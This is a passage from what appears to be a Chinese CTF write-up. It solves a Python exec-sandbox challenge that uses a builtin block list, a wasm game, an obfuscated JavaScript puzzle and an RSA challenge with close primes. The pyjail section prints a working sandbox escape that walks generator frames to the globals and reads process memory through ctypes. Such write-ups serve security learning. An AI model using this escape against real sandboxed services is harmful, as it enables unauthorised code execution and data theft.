md5=06d92f344c7d8c89cb164353ca0fa070</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_2_1.png"></p><h2 id="菜狗工具-2"><a href="#菜狗工具-2" class="headerlink" title="菜狗工具#2"></a>菜狗工具#2</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxx&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;DISPOSED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># current source file is deleted</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码和一差不多，只不过这次是运行后源码被删除了。</p><p>参考链接：<a href="https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/#L3HCTF"> L3HCTF</a>   <a href="https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md">Just a pyjail</a></p><p>大致思路：</p><ol><li>源码被删除，但程序运行了，内存里肯定是有源码的。</li><li>没有 <code>/proc</code>目录，不能通过读文件的方式读内存（参考session伪造利用文件任意读取读取key）</li><li>可以利用指针，把内存的内容读出来，但需要定位一个大致的范围，盲目读取浪费时间。</li></ol><p>先利用栈帧逃逸到全局，后续需要用到全局的<code>flag</code>的地址。</p><p>接着是利用 <code>ctypes</code>模块的指针，将<code>flag</code>地址周围的值读一下，实现一个从内存读源码的操作。</p><p>这里我用了char 指针，读出来的是一个字符串，再加上flag头作为判断，可以很快读出flag。</p><p>每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数）</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">b = frame.f_back.f_globals</span><br><span class="line">flag_id=<span class="built_in">id</span>(b[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">ctypes = b[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"><span class="comment">#print(ctypes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">txt = ctypes.cast((flag_id-<span class="number">8</span>*i),ctypes.c_char_p).value</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line"><span class="built_in">print</span>(txt)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_3_1.png"></p><h2 id="贪吃蛇"><a href="#贪吃蛇" class="headerlink" title="贪吃蛇"></a>贪吃蛇</h2><p>wasm逆向和debug。</p><p>参考链接： <a href="https://lazzzaro.github.io/2021/04/03/reverse-WebAssembly/">WebAssembly</a></p><p>在线网站：<a href="https://webassembly.github.io/wabt/demo/wat2wasm/index.html">wat2wasm demo</a></p><p>先debug，找一个吃到道具能进入debug的断点，然后一直往下找，可以看到 <code>114514</code> 的赋值过程</p><p>我这里是把断点打在 <code>call $wbg.__wbg_crypto_d05b68a3572bb8ca</code></p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_4_1.png"></p><p>一直往下追，可以看到 <code>114514</code> 的转换代码。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_4_2.png"></p><p>修改这部分代码，然后通过在线工具把它再转回 <code>wasm</code> ，之后再用新的 <code>wasm</code> debug。</p><p>这里我把 <code>$var16</code> 改成 0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loop $label8</span><br><span class="line">local.get $var16</span><br><span class="line">i64.const 0</span><br><span class="line">i64.add</span><br><span class="line">local.set $var16</span><br><span class="line">local.get $var1</span><br><span class="line">i32.const 4</span><br><span class="line">i32.add</span><br><span class="line">local.set $var1</span><br><span class="line">local.get $var3</span><br><span class="line">i32.const 1</span><br><span class="line">i32.sub</span><br><span class="line">local.tee $var3</span><br><span class="line">br_if $label8</span><br><span class="line">end $label8</span><br></pre></td></tr></table></figure><p>编译得到<code>wasm</code>，回到本地调试，先在本地用python起一个http服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server -b localhost</span><br></pre></td></tr></table></figure><p>接着访问 <code>localhost:8000</code> 即可得到flag</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_4_3.png"></p><h2 id="爆率真的高"><a href="#爆率真的高" class="headerlink" title="爆率真的高"></a>爆率真的高</h2><p>在线网站：<a href="https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html#google_vignette">JavaScript Deobfuscator</a></p><p>通过在线网站反混淆可以得到比较简洁的源码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x36f7d7</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _0x2b390b = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> _0xc52e83 = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">_0x25d063, _0x14b0af</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x435e43 = _0xc52e83 ? <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x14b0af) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x278c9e = _0x14b0af[<span class="string">&#x27;apply&#x27;</span>](_0x25d063, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> _0x14b0af = <span class="literal">null</span>, _0x278c9e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; : <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> _0xc52e83 = <span class="literal">false</span>, _0x435e43;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;(),</span><br><span class="line">    _0x12600c = <span class="title function_">_0x2b390b</span>(<span class="variable language_">this</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> _0x12600c[<span class="string">&#x27;toString&#x27;</span>]()[<span class="string">&#x27;search&#x27;</span>](<span class="string">&#x27;(((.+)+)+)+$&#x27;</span>)[<span class="string">&#x27;toString&#x27;</span>]()[<span class="string">&#x27;constructor&#x27;</span>](_0x12600c)[<span class="string">&#x27;search&#x27;</span>](<span class="string">&#x27;(((.+)+)+)+$&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x12600c</span>(), <span class="string">&#x27;line-height:200px; padding-block:100px; padding-left:200px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27; viewBox=\&#x27;0 0 200 200\&#x27;%3E%3Cstyle%3E .wrapper %7B font-family: sans-serif; perspective: 500px; text-align: center; position: relative; width: 100%25; height: 100%25; %7D .cube %7B position: absolute; top: 20%25; left: 30%25; transform-style: preserve-3d; transform: rotateY(40deg) rotateX(-40deg); animation: wiggle_wiggle_wiggle_wiggle_wiggle_yeah 3s ease-in-out infinite alternate; %7D .side %7B width: 8rem; height: 8rem; background: rgba(0, 0, 0, 0.8); display: inline-block; position: absolute; line-height: 8rem; color: %23fff; text-align: center; box-sizing: border-box; border: 3px solid %23f00; font-size: 4rem; %7D .front %7B transform: translateZ(4rem); z-index: 1; %7D .back %7B transform: rotateY(180deg) translateZ(4rem); %7D .left %7B transform: rotateY(-90deg) translateZ(4rem); z-index: 1; %7D .right %7B transform: rotateY(90deg) translateZ(4rem); %7D .top %7B transform: rotateX(90deg) translateZ(4rem); %7D .bottom %7B transform: rotateX(-90deg) translateZ(4rem); %7D @keyframes wiggle_wiggle_wiggle_wiggle_wiggle_yeah %7B 0%25 %7B transform: rotateY(&#123;a&#125;deg) rotateX(-&#123;a&#125;deg); %7D 100%25 %7B transform: rotateY(&#123;b&#125;deg) rotateX(-&#123;b&#125;deg); %7D %7D %3C/style%3E%3CforeignObject width=\&#x27;100%25\&#x27; height=\&#x27;100%25\&#x27;%3E%3Cdiv xmlns=\&#x27;http://www.w3.org/1999/xhtml\&#x27; class=\&#x27;wrapper\&#x27;%3E%3Cdiv class=\&#x27;cube\&#x27;%3E%3Cdiv class=\&#x27;side front\&#x27;%3E1%3C/div%3E%3Cdiv class=\&#x27;side back\&#x27;%3E2%3C/div%3E%3Cdiv class=\&#x27;side left\&#x27;%3E3%3C/div%3E%3Cdiv class=\&#x27;side right\&#x27;%3E4%3C/div%3E%3Cdiv class=\&#x27;side top\&#x27;%3E5%3C/div%3E%3Cdiv class=\&#x27;side bottom\&#x27;%3E6%3C/div%3E%3C/div%3E%3C/div%3E%3C/foreignObject%3E%3C/svg%3E&quot;)||line-height:50px; padding-left:500px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27;%3E %3Cpath id=\&#x27;path1394\&#x27; style=\&#x27;fill:none%3Bstroke:%23000000%3Bstroke-width:0.264583px%3Bstroke-linecap:butt%3Bstroke-linejoin:miter%3Bstroke-opacity:1\&#x27; d=\&#x27;m 221.50185,6.5147602 3.99292,2.94215 0.4203,14.0802888 3.78277,2.521842 -3.78277,2.731996 -0.21015,14.500595 -3.99292,2.942151 m -75.76812,-32.68897 -0.18289,26.152093 4.20628,-0.18288 0.18289,-0.365766 m 39.51762,-10.582347 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 17.49855,11.609045 -0.18288,-12.070196 2.56034,-3.840517 6.76663,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 M 79.249122,29.337219 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 106.868818,-7.460739 -10.0585,0.731527 -3.10899,7.315272 0.73153,5.852215 2.74322,3.108989 8.77833,0.182883 0.73152,-0.182883 m -29.84386,-8.105803 8.77833,-0.365762 2.0117,-2.743227 -2.37747,-3.291872 h -8.9612 l -2.19458,4.0234 0.18288,7.863914 3.29187,2.560347 8.0468,-0.365766 m -36.86029,-9.455308 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m -5.20252,-3.51165 -7.58959,-0.182882 -2.28602,3.931959 V 32.0765 l 8.86976,0.182882 1.5545,1.554493 -0.27433,4.206283 -1.46305,2.377461 -8.32112,0.09144 h 0.4572 m -17.006391,0.457205 -0.18288,-12.070196 2.56034,-3.840517 6.766631,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 m -32.373283,-17.720279 -10.058498,0.731527 -3.108989,7.315272 0.731526,5.852215 2.743226,3.108989 8.778325,0.182883 0.731528,-0.182883 m -15.544951,1.645936 0.731528,0.365766 -4.0234,-2.926109 L 56.87623,24.689039 53.401478,22.128694 57.607759,18.836823 57.241995,6.5837438 59.985222,3.4747537 m -17.008004,34.0160083 8.961204,-0.18288 v 0 m -8.961204,0.18288 -0.182883,-10.058495 9.144087,-0.182883 v 22.860222 h -8.961204 l 0.548645,-0.365765 H 43.34298 m -15.54495,-27.98091 5.852215,-0.182882 0.182883,16.276478 m -0.365763,-10.790025 -7.13239,0.182882 V 38.22229 l 12.43596,-0.365763 V 37.490762 M 19.202586,12.43596 l -0.182882,26.152093 4.206281,-0.18288 0.182882,-0.365766 M 14.996305,12.618842 H 10.241379 L 10.058498,38.039407 5.8522165,37.856527 M 3.8405173,22.67734 15.910714,22.494458\&#x27; %2F%3E %3C%2Fsvg%3E&quot;)||console.log||console.clear||Math.random||Math.floor||setTimeout&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _0x4d032d = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">2</span>]),</span><br><span class="line">  _0x4d3fb4 = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">3</span>]),</span><br><span class="line">  _0x280bbf = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">4</span>]),</span><br><span class="line">  _0x3ede16 = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">5</span>]),</span><br><span class="line">  _0x13a155 = <span class="built_in">eval</span>(<span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">6</span>]);</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0x5da15b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x5da15b</span>(_0x5da15b);</span><br><span class="line">&#125;)(<span class="keyword">function</span> (<span class="params">_0xc4be8d</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">_0x3a3176</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x7936d0 = <span class="number">0</span>; _0x7936d0 &lt; <span class="number">100</span>; _0x7936d0++) &#123;</span><br><span class="line">      <span class="keyword">var</span> _0x38d961 = <span class="literal">false</span>,</span><br><span class="line">        _0x48b8aa = <span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">        _0x48a4aa = <span class="number">60</span> * _0x7936d0 / <span class="number">100</span>,</span><br><span class="line">        _0x54870d = <span class="number">60</span> - <span class="number">60</span> * _0x7936d0 / <span class="number">100</span>;</span><br><span class="line">      <span class="title function_">_0x280bbf</span>() &gt;= <span class="number">0.9999</span> &amp;&amp; (_0x48b8aa = <span class="title function_">_0x36f7d7</span>()[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">1</span>], _0x38d961 = <span class="literal">true</span>);</span><br><span class="line">      <span class="title function_">_0x4d032d</span>(<span class="string">&#x27;%c &#x27;</span>, _0x48b8aa[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;a\&#125;/gm</span>, _0x48a4aa + <span class="string">&#x27;&#x27;</span>)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;b\&#125;/gm</span>, _0x54870d + <span class="string">&#x27;&#x27;</span>));</span><br><span class="line">      <span class="keyword">if</span> (_0x38d961) <span class="title function_">_0x4d3fb4</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">_0x13a155</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">_0xc4be8d</span>(_0xc4be8d)();</span><br><span class="line">    &#125;, <span class="number">500</span>), <span class="title function_">_0x13a155</span>(_0x4d3fb4, <span class="number">450</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>通过分析，可以知道当 <code>Math.random&gt;= 0.9999 </code>时，会输出flag，手动调整一下代码，即可得到flag。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x36f7d7 = <span class="string">&#x27;line-height:200px; padding-block:100px; padding-left:200px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27; viewBox=\&#x27;0 0 200 200\&#x27;%3E%3Cstyle%3E .wrapper %7B font-family: sans-serif; perspective: 500px; text-align: center; position: relative; width: 100%25; height: 100%25; %7D .cube %7B position: absolute; top: 20%25; left: 30%25; transform-style: preserve-3d; transform: rotateY(40deg) rotateX(-40deg); animation: wiggle_wiggle_wiggle_wiggle_wiggle_yeah 3s ease-in-out infinite alternate; %7D .side %7B width: 8rem; height: 8rem; background: rgba(0, 0, 0, 0.8); display: inline-block; position: absolute; line-height: 8rem; color: %23fff; text-align: center; box-sizing: border-box; border: 3px solid %23f00; font-size: 4rem; %7D .front %7B transform: translateZ(4rem); z-index: 1; %7D .back %7B transform: rotateY(180deg) translateZ(4rem); %7D .left %7B transform: rotateY(-90deg) translateZ(4rem); z-index: 1; %7D .right %7B transform: rotateY(90deg) translateZ(4rem); %7D .top %7B transform: rotateX(90deg) translateZ(4rem); %7D .bottom %7B transform: rotateX(-90deg) translateZ(4rem); %7D @keyframes wiggle_wiggle_wiggle_wiggle_wiggle_yeah %7B 0%25 %7B transform: rotateY(&#123;a&#125;deg) rotateX(-&#123;a&#125;deg); %7D 100%25 %7B transform: rotateY(&#123;b&#125;deg) rotateX(-&#123;b&#125;deg); %7D %7D %3C/style%3E%3CforeignObject width=\&#x27;100%25\&#x27; height=\&#x27;100%25\&#x27;%3E%3Cdiv xmlns=\&#x27;http://www.w3.org/1999/xhtml\&#x27; class=\&#x27;wrapper\&#x27;%3E%3Cdiv class=\&#x27;cube\&#x27;%3E%3Cdiv class=\&#x27;side front\&#x27;%3E1%3C/div%3E%3Cdiv class=\&#x27;side back\&#x27;%3E2%3C/div%3E%3Cdiv class=\&#x27;side left\&#x27;%3E3%3C/div%3E%3Cdiv class=\&#x27;side right\&#x27;%3E4%3C/div%3E%3Cdiv class=\&#x27;side top\&#x27;%3E5%3C/div%3E%3Cdiv class=\&#x27;side bottom\&#x27;%3E6%3C/div%3E%3C/div%3E%3C/div%3E%3C/foreignObject%3E%3C/svg%3E&quot;)||line-height:50px; padding-left:500px; background-repeat:no-repeat;background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27;%3E %3Cpath id=\&#x27;path1394\&#x27; style=\&#x27;fill:none%3Bstroke:%23000000%3Bstroke-width:0.264583px%3Bstroke-linecap:butt%3Bstroke-linejoin:miter%3Bstroke-opacity:1\&#x27; d=\&#x27;m 221.50185,6.5147602 3.99292,2.94215 0.4203,14.0802888 3.78277,2.521842 -3.78277,2.731996 -0.21015,14.500595 -3.99292,2.942151 m -75.76812,-32.68897 -0.18289,26.152093 4.20628,-0.18288 0.18289,-0.365766 m 39.51762,-10.582347 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 17.49855,11.609045 -0.18288,-12.070196 2.56034,-3.840517 6.76663,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 M 79.249122,29.337219 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m 106.868818,-7.460739 -10.0585,0.731527 -3.10899,7.315272 0.73153,5.852215 2.74322,3.108989 8.77833,0.182883 0.73152,-0.182883 m -29.84386,-8.105803 8.77833,-0.365762 2.0117,-2.743227 -2.37747,-3.291872 h -8.9612 l -2.19458,4.0234 0.18288,7.863914 3.29187,2.560347 8.0468,-0.365766 m -36.86029,-9.455308 v 7.863917 l 2.19458,2.926109 h 8.04679 l 2.74323,-3.108992 -0.36576,-7.498151 -1.82882,-3.474754 -8.22968,-0.182882 z m -5.20252,-3.51165 -7.58959,-0.182882 -2.28602,3.931959 V 32.0765 l 8.86976,0.182882 1.5545,1.554493 -0.27433,4.206283 -1.46305,2.377461 -8.32112,0.09144 h 0.4572 m -17.006391,0.457205 -0.18288,-12.070196 2.56034,-3.840517 6.766631,0.182882 2.37746,3.474755 0.18288,12.253076 v 0 m -32.373283,-17.720279 -10.058498,0.731527 -3.108989,7.315272 0.731526,5.852215 2.743226,3.108989 8.778325,0.182883 0.731528,-0.182883 m -15.544951,1.645936 0.731528,0.365766 -4.0234,-2.926109 L 56.87623,24.689039 53.401478,22.128694 57.607759,18.836823 57.241995,6.5837438 59.985222,3.4747537 m -17.008004,34.0160083 8.961204,-0.18288 v 0 m -8.961204,0.18288 -0.182883,-10.058495 9.144087,-0.182883 v 22.860222 h -8.961204 l 0.548645,-0.365765 H 43.34298 m -15.54495,-27.98091 5.852215,-0.182882 0.182883,16.276478 m -0.365763,-10.790025 -7.13239,0.182882 V 38.22229 l 12.43596,-0.365763 V 37.490762 M 19.202586,12.43596 l -0.182882,26.152093 4.206281,-0.18288 0.182882,-0.365766 M 14.996305,12.618842 H 10.241379 L 10.058498,38.039407 5.8522165,37.856527 M 3.8405173,22.67734 15.910714,22.494458\&#x27; %2F%3E %3C%2Fsvg%3E&quot;)||console.log||console.clear||Math.random||Math.floor||setTimeout&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x38d961 = <span class="literal">false</span>,</span><br><span class="line">_0x48b8aa = _0x36f7d7[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;||&#x27;</span>)[<span class="number">1</span>],</span><br><span class="line">_0x48a4aa = <span class="number">60</span> * <span class="number">0</span> / <span class="number">100</span>,</span><br><span class="line">_0x54870d = <span class="number">60</span> - <span class="number">60</span> * <span class="number">0</span> / <span class="number">100</span>;</span><br><span class="line"><span class="comment">//console.log(_0x48b8aa);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;%c &#x27;</span>, _0x48b8aa[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;a\&#125;/gm</span>, _0x48a4aa + <span class="string">&#x27;&#x27;</span>)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/\&#123;b\&#125;/gm</span>, _0x54870d + <span class="string">&#x27;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag&#123;consolecon&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/w_5_1.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NeXT-RSA"><a href="#NeXT-RSA" class="headerlink" title="NeXT RSA"></a>NeXT RSA</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&quot;???&quot;</span> + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">p = sympy.randprime(<span class="number">1</span>&lt;&lt;<span class="number">1024</span>, <span class="number">1</span>&lt;&lt;<span class="number">1025</span>)</span><br><span class="line">q = sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">r = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n, e, c)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 80044118049755180996754407858488943779355738585718372337839486032339412481191013051614126608584578841408197524632831442032118319629160505851518198448787590483634506563248531254421862061651099856312546562506221294620627871718678484548245902274972044599314097339549053518589561289734819710218838311181044519738709148493164321955860982700783886286661558574861608455547990794798848491695189544811325833194530596317989718866319530140199263278168146224240677087191093183415595617994125075880280632369616506148501757653260154487000183157405531772172082897743929126980157956142627803176227942226654177011633301413616266656761 65537 23280133104463252598665779150831148192014617461904564929071121215373331248942762386170411274023248423328388793808975632652896384007449549469345318875514363621903138122407682293848670093433946555776164835208375667498606187869211466397624286383057425296636315379314349307816391315242971306898487494604324473266965665471735612154916305882443496151118031672777088597821127499085632141307413890900246444539517971766135909771880642211582699957211983212981047822362311969553832913399476190919026666192056319334425636757404603336130688707109219644178606626422717046059209499394056295682594928581470210114322505904198054215544</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>p，q很接近，用 yafu 分解得到p和q即可解出flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">p = <span class="number">282920692155514106003547048252671592686895074005075494866237126606538876862084869899305020449888011718393569492453806569130653155089937273700159218521084322216860665654750144997585080033855855153273003202489776223708632688666001227407722693831850421351342688928312148753704357824181010753634918089083718774469</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">282920692155514106003547048252671592686895074005075494866237126606538876862084869899305020449888011718393569492453806569130653155089937273700159218521084322216860665654750144997585080033855855153273003202489776223708632688666001227407722693831850421351342688928312148753704357824181010753634918089083718773669</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment">#填c</span></span><br><span class="line">c=<span 